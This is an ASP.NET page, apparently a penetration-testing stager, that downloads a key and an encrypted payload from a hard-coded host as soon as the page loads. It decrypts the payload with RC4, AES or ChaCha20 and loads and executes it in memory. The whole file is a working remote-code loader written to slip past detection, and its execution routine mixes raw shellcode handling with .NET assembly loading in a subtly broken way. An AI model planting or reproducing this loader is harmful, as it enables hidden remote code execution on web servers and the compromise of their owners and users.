<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Reflection" %>

<script runat="server">

    private byte[] DownloadFile(string url)
    {
        WebClient client = new WebClient();
        return client.DownloadData(url);
    }

    private byte[] RC4Decrypt(byte[] key, byte[] data)
    {
        byte[] S = Enumerable.Range(0, 256).Select(i => (byte)i).ToArray();
        int j = 0;

        for (int i = 0; i < 256; i++)
        {
            j = (j + S[i] + key[i % key.Length]) % 256;
            byte temp = S[i];
            S[i] = S[j];
            S[j] = temp;
        }

        int i1 = 0;
        j = 0;
        return data.Select(b =>
        {
            i1 = (i1 + 1) % 256;
            j = (j + S[i1]) % 256;
            byte temp = S[i1];
            S[i1] = S[j];
            S[j] = temp;
            return (byte)(b ^ S[(S[i1] + S[j]) % 256]);
        }).ToArray();
    }

    private byte[] AESDecrypt(byte[] key, byte[] data)
    {
        byte[] nonce = data.Take(16).ToArray();
        byte[] tag = data.Skip(16).Take(16).ToArray();
        byte[] ciphertext = data.Skip(32).ToArray();

        AesGcm aes = new AesGcm(key);
        byte[] decrypted = new byte[ciphertext.Length];
        aes.Decrypt(nonce, ciphertext, tag, decrypted);
        return decrypted;
    }

    private byte[] ChaCha20Decrypt(byte[] key, byte[] data)
    {
        byte[] nonce = data.Take(12).ToArray();
        byte[] ciphertext = data.Skip(12).ToArray();

        using (ChaCha20Poly1305 cipher = new ChaCha20Poly1305(key))
        {
            byte[] plaintext = new byte[ciphertext.Length];
            cipher.Decrypt(nonce, ciphertext, plaintext);
            return plaintext;
        }
    }

    private void ExecuteShellcode(byte[] shellcode)
    {
        Type[] types = new Type[] { typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(bool), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(uint) };
        object[] parameters = new object[] { (uint)0x1000, (uint)shellcode.Length, (uint)0x40, (uint)0, true, (uint)0, (uint)0, (uint)0, (uint)0, (uint)0 };

        Assembly assembly = AppDomain.CurrentDomain.Load(shellcode);
        MethodInfo method = assembly.EntryPoint;
        method.Invoke(null, parameters);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        string keyUrl = "http://192.168.45.192:8000/key.txt";
        string shellcodeUrl = "http://192.168.45.192:8000/file.txt";

        // Download key and shellcode
        string[] keyFile = Encoding.UTF8.GetString(DownloadFile(keyUrl)).Split('\n');
        byte[] encryptedShellcode = DownloadFile(shellcodeUrl);

        string encryptionType = keyFile[0].Trim();
        byte[] key = Convert.FromBase64String(keyFile[1].Trim());

        byte[] decryptedShellcode = null;

        // Decrypt based on type
        if (encryptionType == "RC4")
        {
            decryptedShellcode = RC4Decrypt(key, encryptedShellcode);
        }
        else if (encryptionType == "AES")
        {
            decryptedShellcode = AESDecrypt(key, encryptedShellcode);
        }
        else if (encryptionType == "ChaCha20")
        {
            decryptedShellcode = ChaCha20Decrypt(key, encryptedShellcode);
        }

        // Execute the shellcode
        if (decryptedShellcode != null)
        {
            ExecuteShellcode(decryptedShellcode);
        }
    }
</script>
